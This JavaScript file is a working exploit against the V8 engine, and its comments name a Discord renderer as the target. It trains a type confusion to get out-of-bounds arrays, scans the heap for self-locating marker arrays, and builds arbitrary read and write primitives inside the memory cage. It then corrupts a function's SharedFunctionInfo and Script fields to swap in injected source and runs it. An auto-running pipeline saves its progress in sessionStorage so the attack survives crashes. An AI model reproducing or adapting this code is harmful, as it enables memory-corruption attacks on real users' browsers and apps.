// V8 14.8 transport note: on a planted array, copyWithin with a distant
// destination index (write) silently does not land, while distant source
// reads work. All writes therefore go through short element stores on the
// plant (wPtr/wSmi); reads stay source-side (readExact/read4fast).

globalThis.__x = (function () { 
    'use strict';
    const f64 = new Float64Array(1);
    const u32 = new Uint32Array(f64.buffer);
    const fromBits = (lo, hi) => { u32[0] = lo >>> 0; u32[1] = hi >>> 0; return f64[0]; };
    const loOf = (d) => { f64[0] = d; return u32[0] >>> 0; };
    const HI = 0x3ff00000;

    // ---- anchor constants ----
    // Every word read through a plant arrives as a Smi (planted read), so all
    // signature words must be EVEN or strict === against them never matches.
    const TAG = 0x41414140;                 // hi32 of each marker slot (exp 0x414: non-NaN, even)
    const TAG_SMI = TAG >>> 1;              // 0x20A0A0A0 as Smi
    const MARK_SLOTS = 16 * 1024 * 1024;    // 16M doubles = 128MB marker
    const BLOCK = 16384;                    // build block (128KB, large-object path)
    const ABT = 0x42424242, ABT_SMI = ABT >>> 1;
    const RUN = 10008;                      // holder fill Smi; as a word 20016 = 0x4E30
    const V1 = 0x2ABCAB, V2 = 0x3BCDDE;     // dynamic verify Smis for holder[0]/[1]
    const RUN_WORD = RUN * 2;
    const MAG16_LO = 0x0E0D0C0A, MAG16_HI = 0x41424344;  // verify word at marker[16] (lands at D+128)

    // ---- 1. anchors: first allocations of the context ----
    const tAnchor0 = Date.now();
    // AB probe: 16MB, 16 bytes of signature every 0x1000: [p*2, ABT, p*2, ABT]
    const abBytes = 16 * 1024 * 1024;
    const ab = new ArrayBuffer(abBytes);
    const abU32 = new Uint32Array(ab);
    for (let p = 0; p < abBytes / 4096; ++p) {
        const o = p * 1024;
        abU32[o] = p * 2; abU32[o + 1] = ABT; abU32[o + 2] = p * 2; abU32[o + 3] = ABT;
    }
    // marker: 16M doubles, every slot encodes its own index -> self-locating:
    // any probe that lands anywhere inside the marker yields its exact base.
    const blocks = new Array(MARK_SLOTS / BLOCK);
    for (let b = 0; b < blocks.length; ++b) {
        const blk = new Array(BLOCK).fill(0);       // PACKED_SMI -> double-store -> PACKED_DOUBLE
        const base = b * BLOCK;
        for (let i = 0; i < BLOCK; ++i) blk[i] = fromBits(((base + i) * 2) >>> 0, TAG);
        blocks[b] = blk;
    }
    const marker = Array.prototype.concat.apply(blocks[0], blocks.slice(1));
    marker[16] = fromBits(MAG16_LO, MAG16_HI);    // verify word (slot 16 -> D+128)
    // holder: FixedArray 4M Smis (RUN fill), [0]/[1] = V1/V2 for dynamic verify
    const holder = new Array(4 * 1024 * 1024).fill(RUN);
    holder[0] = V1; holder[1] = V2;
    const tAnchor1 = Date.now();
    const anchorMs = tAnchor1 - tAnchor0;

    // ---- 2. lazy wrapped target + name table ----
    // (0,eval) in the pipeline tail compiles this at global scope AFTER the
    // anchors exist; the huge comment keeps the source in large-object space.
    // names feeds the wrapped-compile DeserializeScopeChain/GetString path.
    // spillfn itself is referenced via globalThis.spillfn.
    const HDR = 'function spillfn(){';
    const source = HDR + ' '.repeat(64) + 'return 0;}' + '/*' + 'A'.repeat(300000) + '*/';
    globalThis.__r25src = source;
    const names = Array.from({ length: 0x10000 }, (_, i) => 'p' + i);

    // ---- 3. LLE machine (natives-free) ----
    const st = { trig: 0 };
    function set0(a, v) { a[0] = v; }
    function set7(a, v) { a[7] = v; }
    const doubleArray = Array(8);
    function warmKeys(a) { const x = a[0], y = a[32765], z = a[32766]; return x + (y ? 1 : 0) + (z ? 2 : 0); }
    const warmRest = Array(32767).fill(0);
    for (let i = 0; i < 20000; ++i) warmKeys(warmRest);
    function carrier(...rest) {
        const receiver = rest[32765] ? rest[32766] : doubleArray;
        set0(receiver, 1.1);
    }
    const bigArgs = Array(32765).fill(0);
    const boundCarrier = carrier.bind(null, ...bigArgs);
    function callCarrierSmall(t) { return carrier.apply(null, [t, 0].concat(bigArgs)); }
    for (let i = 0; i < 5000; ++i) callCarrierSmall(0);
    function victim(payload) {
        const staleArray = Array(8);
        const target = [];
        if (!st.trig) staleArray.x = 0;
        boundCarrier(st.trig, staleArray);
        set7(staleArray, payload);
        return { target, staleArray };
    }
    const BENIGN = fromBits(0x000007e5, 0x3ff00000);
    function aliveCheck(r) { try { return Array.isArray(r.target) && r.target.length > 100000; } catch (e) { return false; } }
    // victim with elements left in new space while planted = death on the next
    // scavenge (conservative stack scan keeps the hijacked ref alive). On plant
    // failure: scrub frames + drain allocations, then retry the hijack.
    function plant(B) {
        const p = fromBits(((B | 1) >>> 0), HI);
        for (let t = 0; t < 8; ++t) {
            st.trig = 1;
            const r = victim(p);
            try { if (aliveCheck(r)) return r.target; } catch (e) {}
            st.trig = 0; victim(0); st.trig = 1;
        }
        scrub(); drain();
        return null;
    }
    // scrub: overwrite frame slots to drop conservative pins of dead hijacked refs
    function scrub() {
        const f = (a) => {
            let s0 = a + 1, s1 = a + 2, s2 = a + 3, s3 = a + 4, s4 = a + 5, s5 = a + 6, s6 = a + 7, s7 = a + 8;
            let s8 = a + 9, s9 = a + 10, s10 = a + 11, s11 = a + 12, s12 = a + 13, s13 = a + 14, s14 = a + 15, s15 = a + 16;
            return ((((s0 + s1) + (s2 + s3)) + ((s4 + s5) + (s6 + s7))) + (((s8 + s9) + (s10 + s11)) + ((s12 + s13) + (s14 + s15))));
        };
        let acc = 0;
        for (let k = 0; k < 512; ++k) acc += f(k);
        return acc & 1;
    }
    // drain: force scavenges with small garbage while nothing is planted
    function drain() {
        for (let k = 0; k < 400000; ++k) { const junk = [k, k + 1, k + 2, k + 3, k + 4]; if (junk[4] === -1) return k; }
        return 0;
    }
    function quiesce() { scrub(); return drain(); }
    // word copy with a smarter base: fixed base inside the marker (large object,
    // scavenge-safe) whenever both endpoints are above markerSlot, so no quiesce
    // is needed; otherwise the old min-8 base
    function copyWordSmart(X, Y) {
        if (X === Y) return true;
        const fast = X > markerSlot && Y > markerSlot && markerSlot;
        const B = fast ? markerSlot - 8 : (X < Y ? X : Y) - 8;
        const t = plant(B);
        if (!t) return false;
        const si = (X - B - 8) / 4, di = (Y - B - 8) / 4;
        t.copyWithin(di, si, si + 1);
        if (!fast) quiesce();
        return true;
    }

    // ---- 4. cage primitives ----
    let D = 0;            // marker data base (self-located)
    let markerSlot = 0;   // = D + 128, address of marker[16]
    let holderData = 0;   // FixedArray base of the holder
    function copyWord(X, Y) {
        if (X === Y) return true;
        const B = (X < Y ? X : Y) - 8;
        const t = plant(B);
        if (!t) return false;
        const si = (X - B - 8) / 4, di = (Y - B - 8) / 4;
        t.copyWithin(di, si, si + 1);
        quiesce();
        return true;
    }
    // n words in one plant: fewer plants = fewer GC windows after scan churn
    function copyWords(X, Y, n) {
        if (X === Y) return true;
        const B = (X < Y ? X : Y) - 8;
        const t = plant(B);
        if (!t) return false;
        const si = (X - B - 8) / 4, di = (Y - B - 8) / 4;
        t.copyWithin(di, si, si + n);
        quiesce();
        return true;
    }
    const rd = [0, 0, 0, 0];
    // read 4 words with a FIXED plant base markerSlot-8 (inside the marker: a
    // large object, always scavenge-safe, no quiesce). Only the copyWithin
    // SOURCE varies. Valid for W above markerSlot.
    function read4fast(W) {
        const B = markerSlot - 8;
        const t = plant(B);
        if (!t) return null;
        const si = (W - B - 8) / 4;
        t.copyWithin(0, si, si + 4);
        rd[0] = loOf(marker[16]);
        rd[1] = (f64[0] = marker[16], u32[1] >>> 0);
        rd[2] = loOf(marker[17]);
        rd[3] = (f64[0] = marker[17], u32[1] >>> 0);
        return rd;
    }
    function read4(W) {                 // 4 words at W into rd
        if (!markerSlot) return null;
        if (W > markerSlot) return read4fast(W);
        if (!copyWords(W, markerSlot, 4)) return null;
        rd[0] = loOf(marker[16]);
        rd[1] = (f64[0] = marker[16], u32[1] >>> 0);
        rd[2] = loOf(marker[17]);
        rd[3] = (f64[0] = marker[17], u32[1] >>> 0);
        return rd;
    }
    function readExact(W) {
        if (!markerSlot) return null;
        if (!copyWord(W, markerSlot)) return null;
        return loOf(marker[16]);
    }
    function writeExact32(W, word) {
        if (!markerSlot) return false;
        marker[16] = fromBits(word, 0);
        return copyWord(markerSlot, W);
    }
    // new-space churn to detach any planted array from live GC state before
    // navigate (survivor scavenge/deopt-window protection)
    function settle() {
        for (let k = 0; k < 24; ++k) {
            const junk = new Array(65536).fill(k);
            if (junk[7] === -1) return k;
        }
        return 0;
    }
    function verifyD(cand) {
        const t = plant(cand + 120);              // t[0] lands on cand+128 = marker[16]
        if (!t) return false;
        const ok = t[0] === (MAG16_LO >>> 1) && t[1] === (MAG16_HI >>> 1);
        quiesce();
        return ok;
    }

    // ---- 5. coarse scan; detection via strict === only ----
    // probe at base a: t[0..3] = words a+8..a+20
    // tick(a) fires before each probe so the caller can persist the resume
    // point: an unmapped cage page kills the renderer mid-probe, and the next
    // document must resume one step PAST the dead probe, not at the chunk start
    function scanChunk(lo, hi, step, tick) {
        let probes = 0, planted = 0, nulls = 0, abHit = 0, last = 0;
        for (let a = lo; a < hi; a += step) {
            last = a;
            if (tick) tick(a);
            let t = plant(a);
            if (!t) {
                // plant failure: rewarm + flush hijack poison out of new space
                rewarm(); scrub(); drain();
                t = plant(a);
                if (!t) { nulls++; continue; }
            }
            planted++;
            const w0 = t[0], w1 = t[1], w2 = t[2], w3 = t[3];
            if (w1 === TAG_SMI && w3 === TAG_SMI) {           // case A: (idx,TAG,idx+1,TAG)
                const idx = w0;
                if (idx === (idx | 0) && idx >= 0 && idx < MARK_SLOTS && w2 === idx + 1) {
                    const cand = (a + 8) - 8 * idx;
                    if (cand > 0 && verifyD(cand)) { D = cand; markerSlot = cand + 128; return 'D' + D.toString(16) + '|p' + planted + ' n' + nulls + ' L' + last.toString(16); }
                }
            } else if (w0 === TAG_SMI && w2 === TAG_SMI) {    // case B: (TAG,idx,TAG,idx+1)
                const idx = w1;
                if (idx === (idx | 0) && idx >= 0 && idx < MARK_SLOTS && w3 === idx + 1) {
                    const cand = (a + 12) - 8 * idx;
                    if (cand > 0 && verifyD(cand)) { D = cand; markerSlot = cand + 128; return 'D' + D.toString(16) + '|p' + planted + ' n' + nulls + ' L' + last.toString(16); }
                }
            } else if (w1 === ABT_SMI && w3 === ABT_SMI && w0 === w2) {
                abHit = a;                                       // AB probe sighted
            }
            quiesce();
        }
        return 'd0|p' + planted + ' n' + nulls + ' L' + last.toString(16) + (abHit ? ' AB' + (abHit + 8).toString(16) : '');
    }

    const TRACE = (typeof print === 'function') ? print : ((m) => { globalThis.__trace = (globalThis.__trace || '') + m + ';'; });
    // ---- 6. holder location ----
    // holder sits right above the marker with a semispace gap; located by
    // RUN-signature via source-side reads (read4fast). RUN window found coarse,
    // then bin-searched down to the boundary word.
    function locateHolder() {
        if (!D) return 'no-D';
        const span = 8 * MARK_SLOTS;
        let hitA = 0;
        for (let a = D + span; a < D + span + 0x10000000; a += 0x100000) {
            const h = read4fast(a);
            if (h && h[0] === RUN_WORD && h[1] === RUN_WORD && h[2] === RUN_WORD && h[3] === RUN_WORD) { hitA = a; break; }
        }
        if (!hitA) return 'run-miss';
        // RUN region: bin-search the boundary (predicate: word is RUN)
        let lo = hitA - 0x100000, hi = hitA + 0x1000;
        while (hi - lo > 4) {
            const mid = lo + (((hi - lo) >> 1) & ~3);
            const h = read4fast(mid);
            if (!h) return 'bs-null';
            if (h[0] === RUN_WORD) hi = mid; else lo = mid;
        }
        const cand = hi - 8;                       // [0]=V1,[1]=V2 -> RUN begins 2 slots later
        const v = read4fast(cand);
        if (!v || v[0] !== V1 * 2 || v[1] !== V2 * 2 || v[2] !== RUN_WORD || v[3] !== RUN_WORD) {
            return 'vfail';
        }
        holderData = cand;
        holder[0] = globalThis.spillfn; holder[1] = names; // keep both GC-reachable
        // d8 needs explicit promotion here (scavenger-crash profile); a live
        // Discord renderer churns ~1.2M allocations during scan, which promotes
        // naturally. __r25q is set only by the d8 harness.
        if (globalThis.__r25q) { quiesce(); quiesce(); quiesce(); }
        return 'OK H' + holderData.toString(16);
    }

    // ---- 7. warm phases A/B/C (alternate B/C halves: live state is caught
    // in 2-3 rounds; 12 B-batches alone would take minutes) ----
    const warm = { stage: 'A', i: 0 };
    function warmStep() {
        if (warm.stage === 'A') {
            for (let i = 0; i < 2000; ++i) { st.trig = 1; victim(BENIGN); st.trig = 0; victim(0); }
            warm.stage = 'BC'; warm.i = 0;
            return 'more';
        }
        if (warm.stage !== 'BC') return warm.stage === 'live' ? 'live' : 'dead';
        for (let i = 0; i < 10000; ++i) victim(0);          // B-half
        st.trig = 1;
        try {
            for (let i = 0; i < 4000; ++i) {                // C-half: check for live
                const r = victim(BENIGN);
                if ((i & 1023) === 0 && aliveCheck(r)) { warm.stage = 'live'; return 'live'; }
            }
        } finally { st.trig = 0; }
        if (++warm.i >= 24) { warm.stage = 'dead'; return 'dead'; }
        return 'more';
    }
    function rewarm() {
        let ok = false;
        for (let c = 0; c < 8 && !ok; c++) {
            st.trig = 1;
            try { for (let i = 0; i < 3000; i++) { const rr = victim(BENIGN); if ((i & 511) === 0 && aliveCheck(rr)) { ok = true; break; } } } finally { st.trig = 0; }
        }
        return ok ? 'w+' : 'w-';
    }

    // ---- 8. corrupt + spill ----
    function setBody(j, val) {
        const body = 'p' + j + '=' + val + ';';
        holder[2] = (' '.repeat(HDR.length) + body + ' '.repeat(64)).padEnd(source.length, ' ');
    }
    function hex(x) { return '0x' + (x >>> 0).toString(16); }
    let navMode = 'all';
    let lastDiag = 0;                 // SFI of the last navigate, for diagNames
    function navigateAndCorrupt(mode) { navMode = mode || 'all'; return navigateInner(); }
    // 15.2-style navigate (copyWithin writes): works on d8, kept for validation
    function navigateInner() {
        // verbatim walk from the d8 harness (anchors sized 128MB/16MB):
        // readExact-based reads (base=min-8) plus post-write verify
        for (let attempt = 0; attempt < 6; ++attempt) {
            const fnW = readExact(holderData + 0);
            const namesW = readExact(holderData + 4);
            const replW = readExact(holderData + 8);
            if (fnW === null || namesW === null || replW === null) return 'nav-null';
            const fnAddr = fnW & ~1;
            const sfiW = readExact(fnAddr + 16);        if (sfiW === null) return 'sfi-null';
            const sfiAddr = sfiW & ~1;
            const scriptW = readExact(sfiAddr + 20);    if (scriptW === null) return 'script-null';
            const scriptAddr = scriptW & ~1;
            const flagsOld = readExact(sfiAddr + 32);   if (flagsOld === null) return 'flags-null';
            const namesAddr = namesW & ~1;
            const namesElemsW = readExact(namesAddr + 8); if (namesElemsW === null) return 'elems-null';
            const MODE = navMode;
            if (MODE !== 'noW2') { if (!copyWord(namesAddr + 8, scriptAddr + 36)) return 'W2-fail'; }
            if (MODE !== 'noW1') { if (!copyWord(holderData + 8, scriptAddr + 4)) return 'W1-fail'; }
            const flagsNew = ((flagsOld & ~0x380) | (4 << 7)) >>> 0;
            if (!writeExact32(sfiAddr + 32, flagsNew)) return 'W3-fail';
            const v1 = readExact(scriptAddr + 4);
            const v2 = readExact(scriptAddr + 36);
            const v3 = readExact(sfiAddr + 32);
            if (v1 !== replW || v2 !== namesElemsW || v3 !== flagsNew) {
                if (attempt >= 1) {
                    return 'vfail v1=' + (v1 === null ? 'null' : v1.toString(16)) + '/' + replW.toString(16) +
                        ' v2=' + (v2 === null ? 'null' : v2.toString(16)) + '/' + namesElemsW.toString(16) +
                        ' v3=' + (v3 === null ? 'null' : v3.toString(16)) + '/' + flagsNew.toString(16) +
                        ' sc' + scriptAddr.toString(16) + ' sfi' + sfiAddr.toString(16) + ' ne' + namesAddr.toString(16);
                }
                continue;
            }
            lastDiag = sfiAddr;
            return 'OK' + (MODE !== 'all' ? '-' + MODE : '') + ':' + hex(flagsOld) + '>' + hex(flagsNew) + ':sfi' + hex(sfiAddr) + ':sc' + hex(scriptAddr) + ':ne' + hex(namesElemsW);
        }
        return 'verify-fail';
    }
    function stage() {
        let v0 = 0x10000, v1 = 0x10001, v2 = 0x10002, v3 = 0x10003;
        let v4 = 0x10004, v5 = 0x10005, v6 = 0x10006, v7 = 0x10007;
        let v8 = 0x10008, v9 = 0x10009, v10 = 0x1000a, v11 = 0x1000b;
        let v12 = 0x1000c, v13 = 0x1000d, v14 = 0x1000e, v15 = 0x1000f;
        (globalThis.spillfn || function () {})();
        return v0 + ',' + v1 + ',' + v2 + ',' + v3 + ',' + v4 + ',' + v5 + ',' + v6 + ',' + v7 + ',' +
               v8 + ',' + v9 + ',' + v10 + ',' + v11 + ',' + v12 + ',' + v13 + ',' + v14 + ',' + v15;
    }
    // names diagnostics for the wrapped-compile path: element layout, map/hash/
    // length of slot strings, SFI->Script state after navigate
    function diagNames() {
        if (!holderData) return 'no-H';
        const h4 = read4fast(holderData);
        if (!h4) return 'h-null';
        const namesW = h4[1], namesAddr = namesW & ~1;
        const e4 = read4fast(namesAddr + 8);
        if (!e4) return 'e-null';
        const elems = e4[0] & ~1;
        const hd = read4fast(elems);              // [map, length, slot0, slot1]
        const mapW = hd ? hd[0] : -1, lenW = hd ? hd[1] : -1;
        const s4 = read4fast(elems + 8);          // [0..3]
        if (!s4) return 's-null';
        const s0 = s4[0], s1 = s4[1], s2 = s4[2], s3 = s4[3];
        const a = read4fast(s0 & ~1);
        const h0 = a ? a[0] : -1, h1 = a ? a[1] : -1, h2 = a ? a[2] : -1;
        const b = read4fast((s0 & ~1) + 16);
        const t0 = b ? b[0] : -1, t1 = b ? b[1] : -1;
        const mid = read4fast(elems + 8 + 4 * 32768);
        const last = read4fast(elems + 8 + 4 * 65535);
        const sfi = lastDiag;
        let post = '';
        if (sfi) {
            const sc = (readExact(sfi + 20) || 0) & ~1;
            const p1 = read4(sc + 4), p2 = readExact(sc + 36), p3 = readExact(sfi + 32);
            post = ' | post sc' + sc.toString(16) + ' src' + (p1 ? p1[0].toString(16) : 'x') +
                   ' wrap' + (p2 === null ? 'x' : p2.toString(16)) + ' flags' + (p3 === null ? 'x' : p3.toString(16));
        }
        return 'nm' + namesAddr.toString(16) + ' el' + elems.toString(16) +
               ' elhdr ' + mapW.toString(16) + ',' + lenW.toString(16) +
               ' slots ' + s0.toString(16) + ',' + s1.toString(16) + ',' + s2.toString(16) + ',' + s3.toString(16) +
               ' mid ' + (mid ? mid[0].toString(16) : 'x') + ' last ' + (last ? last[0].toString(16) : 'x') +
               ' str0hdr ' + h0.toString(16) + ',' + h1.toString(16) + ',' + h2.toString(16) +
               ' str0+16 ' + t0.toString(16) + ',' + t1.toString(16) + post;
    }
    // 14.8 fix-up helpers: object stores retrain the site cleanly (copyWithin
    // writes are dead on 14.8, distant reads still work)
    function retrainSite() {
        st.trig = 0;
        const clean = victim(0).target;
        try { clean[0] = {}; } catch (e) {}
        st.trig = 1;
    }
    function objAt(x) {              // object currently stored at x
        const t = plant(x - 8);
        return t ? t[0] : null;
    }
    function wPtr(x, ref) {          // store tagged(ref) as an object ref at x
        const t = plant(x - 8);
        if (!t) return false;
        t[0] = ref;
        quiesce();
        return true;
    }
    function wSmi(x, val) {          // store tagged(Smi val) at x
        const t = plant(x - 8);
        if (!t) return false;
        t[0] = val;
        quiesce();
        return true;
    }
    // dump n words at base (source-side reads survive on 14.8)
    function dumpWords(base, n) {
        const out = [];
        for (let o = 0; o < n; o += 4) {
            const r = read4(base + o * 4);
            if (!r) { out.push('x'); break; }
            for (let k = 0; k < 4 && o + k < n; ++k) out.push(r[k].toString(16));
        }
        return out.join(',');
    }
    // navigate diagnostics: SFI words plus the candidate objects at +12/+20
    function navDump() {
        if (!holderData) return 'no-H';
        const fnW = readExact(holderData + 0);
        const namesW = readExact(holderData + 4);
        if (fnW === null || namesW === null) return 'null';
        const fnAddr = fnW & ~1;
        const sfiW = readExact(fnAddr + 16);
        if (sfiW === null) return 'sfi-null';
        const sfiAddr = sfiW & ~1;
        const s12 = readExact(sfiAddr + 12), s20 = readExact(sfiAddr + 20);
        return 'fn' + fnAddr.toString(16) + ' sfi' + sfiAddr.toString(16) +
               ' | sfi[' + dumpWords(sfiAddr, 16) + ']' +
               ' | c12[' + (s12 === null ? 'n' : dumpWords(s12 & ~1, 12)) + ']' +
               ' | c20[' + (s20 === null ? 'n' : dumpWords(s20 & ~1, 12)) + ']' +
               ' | fn[' + dumpWords(fnAddr, 6) + ']';
    }
    // 14.8 navigate (Discord): same walk as navigateInner, but every write is a
    // short element store on the plant (si=0):
    // W1/W2 via t[0]=<object> (PACKED_SMI->PACKED_ELEMENTS changes only the
    // map, the elements stay in place, so the store lands at the target),
    // W3 via t[0]=<Smi>. Reads remain short source-side copies.
    // scriptOff: SFI field holding the Script (12 or 20 across builds).
    function navigateD(scriptOff) {
        if (!holderData) return 'no-H';
        for (let attempt = 0; attempt < 4; ++attempt) {
            const fnW = readExact(holderData + 0);
            const namesW = readExact(holderData + 4);
            const replW = readExact(holderData + 8);
            if (fnW === null || namesW === null || replW === null) return 'nav-null';
            const fnAddr = fnW & ~1;
            const sfiW = readExact(fnAddr + 16);          if (sfiW === null) return 'sfi-null';
            const sfiAddr = sfiW & ~1;
            const scriptW = readExact(sfiAddr + scriptOff); if (scriptW === null) return 'script-null';
            const scriptAddr = scriptW & ~1;
            const flagsOld = readExact(sfiAddr + 32);     if (flagsOld === null) return 'flags-null';
            const namesAddr = namesW & ~1;
            const namesElemsW = readExact(namesAddr + 8); if (namesElemsW === null) return 'elems-null';
            const namesElemRef = objAt(namesAddr + 8);
            if (!namesElemRef) return 'mat-null';
            if (!wPtr(scriptAddr + 36, namesElemRef)) return 'W2-fail';
            if (!wPtr(scriptAddr + 4, holder[2])) return 'W1-fail';
            const flagsNew = ((flagsOld & ~0x380) | (4 << 7)) >>> 0;
            if (flagsNew & 1) return 'flags-odd ' + flagsOld.toString(16);
            if (!wSmi(sfiAddr + 32, flagsNew >>> 1)) return 'W3-fail';
            const v1 = readExact(scriptAddr + 4);
            const v2 = readExact(scriptAddr + 36);
            const v3 = readExact(sfiAddr + 32);
            if (v1 !== replW || v2 !== namesElemsW || v3 !== flagsNew) {
                if (attempt >= 1) return 'vfail v1=' + v1 + '/' + replW + ' v2=' + v2 + '/' + namesElemsW + ' v3=' + v3 + '/' + flagsNew + ' sc' + scriptAddr.toString(16);
                continue;
            }
            lastDiag = sfiAddr;
            return 'OK:' + hex(flagsOld) + '>' + hex(flagsNew) + ':sfi' + hex(sfiAddr) + ':sc' + hex(scriptAddr) + ':ne' + hex(namesElemsW);
        }
        return 'verify-fail';
    }
    function fire() { try { const r = stage(); return 'RET ' + r; } catch (e) { return 'EXC ' + e; } }

    function anchorsReady() {
        return 'D=' + (D ? D.toString(16) : '0') + ' H=' + (holderData ? holderData.toString(16) : '0') +
               ' warm=' + warm.stage + warm.i + ' anchorMs=' + anchorMs;
    }
    return { st, victim, BENIGN, plant, alive: aliveCheck, warmStep, rewarm, scrub, drain, quiesce, settle,
             scanChunk, locateHolder, diagNames, dumpWords, navDump, retrainSite, objAt, wPtr, wSmi, navigateD,
             readExact, read4, writeExact32, copyWord, copyWordSmart, copyWords, setBody, navigateAndCorrupt, fire, anchorsReady,
             holder, marker, ab: abU32 };
})();

// Autonomous pipeline (document-start). One synchronous block: the context
// under 144MB of anchors lives ~30s after document load, so the whole chain
// must complete without yielding to the event loop. Phases:
// A/B/C warm -> rewarm -> marker scan (hint r25d, else wide from r25lo) ->
// locate -> setBody -> navigateD -> fire. Progress and the final result live
// in sessionStorage (r25lo/r25d/r25done): a renderer death is survived by
// Discord reloading the page, the payload re-runs and the scan resumes from
// the saved offset.
;(function () {
    const SS = (typeof sessionStorage !== 'undefined') ? sessionStorage : null;
    const getItem = (k) => { try { return SS ? SS.getItem(k) : null; } catch (e) { return null; } };
    const setItem = (k, v) => { try { if (SS) SS.setItem(k, v); } catch (e) {} };
    const st = { phase: 'init', t0: Date.now() };
    globalThis.__r25 = st;
    try {
        if (getItem('r25done')) { st.phase = 'done:' + getItem('r25done'); return; }
        const x = globalThis.__x;
        if (!x) { st.phase = 'no-x'; return; }
        (0, eval)(globalThis.__r25src);   // create global spillfn (wrapped-compile target)
        // A/B/C warm
        let s;
        while ((s = x.warmStep()) === 'more') { }
        st.phase = 'warm:' + s;
        if (s !== 'live') return;         // dead warm: retry on the next document
        x.rewarm();
        st.phase = 'scan';
        let D = 0, r = '';
        // hint mode: one probe at hint+32MB lands deep inside the 128MB marker
        // under any base jitter; self-location then yields the exact D
        const hint = parseInt(getItem('r25d') || '0', 16) || 0;
        if (hint) {
            for (let t = 0; t < 3 && !D; t++) {
                r = x.scanChunk(hint + 0x2000000, hint + 0x2001000, 0x1000);
                const m = /^D([0-9a-f]+)/.exec(r);
                if (m) D = parseInt(m[1], 16); else x.rewarm();
            }
        }
        // wide scan; r25lo is the next-probe cursor and survives renderer deaths:
        // per-probe saves below mean a crash on an unmapped page costs exactly
        // one probe, and the post-chunk save re-aligns to chunk boundaries
        let lo = parseInt(getItem('r25lo') || '1400000', 16) || 0x1400000;
        if (!D && hint) lo = Math.max(hint - 0x1000000, 0x1400000);
        for (; !D && lo < 0x40000000; lo += 0x2000000) {
            r = x.scanChunk(lo, lo + 0x2000000, 0x100000, (a) => setItem('r25lo', (a + 0x100000).toString(16)));
            setItem('r25lo', (lo + 0x2000000).toString(16));
            st.phase = 'scan:' + lo.toString(16) + ':' + r;
            const m = /^D([0-9a-f]+)/.exec(r);
            if (m) { D = parseInt(m[1], 16); break; }
            x.rewarm();
        }
        if (!D) { st.phase = 'scanmiss:' + r; return; }
        setItem('r25d', D.toString(16));
        st.phase = 'locate';
        const loc = x.locateHolder();
        if (!/^OK H/.test(loc)) { st.phase = 'locfail:' + loc; return; }
        // order matters: locate BEFORE setBody (RUN bin-search expects [2]=RUN),
        // setBody BEFORE navigate (replacement must exist when W1 stores it)
        x.setBody(2, 2833485);
        st.phase = 'nav';
        const cr = x.navigateD(20);
        if (!/^OK/.test(cr)) { st.phase = 'navfail:' + cr; return; }
        st.phase = 'fire';
        const f = x.fire();
        setItem('r25done', f);
        st.phase = 'fired:' + f;
    } catch (e) {
        st.phase = 'err:' + (e && e.message);
    }
})();
